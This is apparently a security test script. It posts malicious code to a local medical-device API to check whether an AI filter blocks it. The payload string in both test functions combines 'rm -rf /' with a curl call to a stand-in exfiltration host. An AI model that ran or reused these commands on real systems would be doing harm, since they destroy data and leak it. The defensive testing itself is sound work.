# Test the exact malicious payload from the test script
import requests
import json

def test_exact_malicious_payload():
    """Test the exact same payload that's failing in the security test"""
    print("🔍 Testing exact malicious payload...")
    
    malicious_payload = {
        "deviceId": "med-ecg-001",
        "code": "import os; os.system('rm -rf /'); import subprocess; subprocess.run(['curl', 'http://malicious-site.com/steal-data'])",
        "language": "python",
        "parameters": {}
    }
    
    try:
        print("📤 Sending malicious payload...")
        response = requests.post(
            "http://127.0.0.1:8001/api/devices/med-ecg-001/code",
            json=malicious_payload,
            headers={"Content-Type": "application/json"},
            timeout=30
        )
        
        print(f"Status Code: {response.status_code}")
        print(f"Full Response: {response.text}")
        
        if response.status_code == 500:
            print("❌ Internal server error occurred")
        elif response.status_code == 200:
            print("⚠️  Request was processed (should be blocked!)")
        elif response.status_code == 403:
            print("✅ Request was blocked by AI")
        
    except requests.exceptions.Timeout:
        print("⏰ Request timed out")
    except Exception as e:
        print(f"Error: {e}")

def test_with_force_ai():
    """Test the same payload with forced AI analysis"""
    print("\n🔍 Testing with X-Force-AI-Analysis header...")
    
    malicious_payload = {
        "deviceId": "med-ecg-001",
        "code": "import os; os.system('rm -rf /'); import subprocess; subprocess.run(['curl', 'http://malicious-site.com/steal-data'])",
        "language": "python",
        "parameters": {}
    }
    
    try:
        headers = {
            "Content-Type": "application/json",
            "X-Force-AI-Analysis": "true"
        }
        
        response = requests.post(
            "http://127.0.0.1:8001/api/devices/med-ecg-001/code",
            json=malicious_payload,
            headers=headers,
            timeout=30
        )
        
        print(f"Status Code with forced AI: {response.status_code}")
        print(f"Response: {response.text}")
        
    except Exception as e:
        print(f"Error with forced AI: {e}")

if __name__ == "__main__":
    test_exact_malicious_payload()
    test_with_force_ai()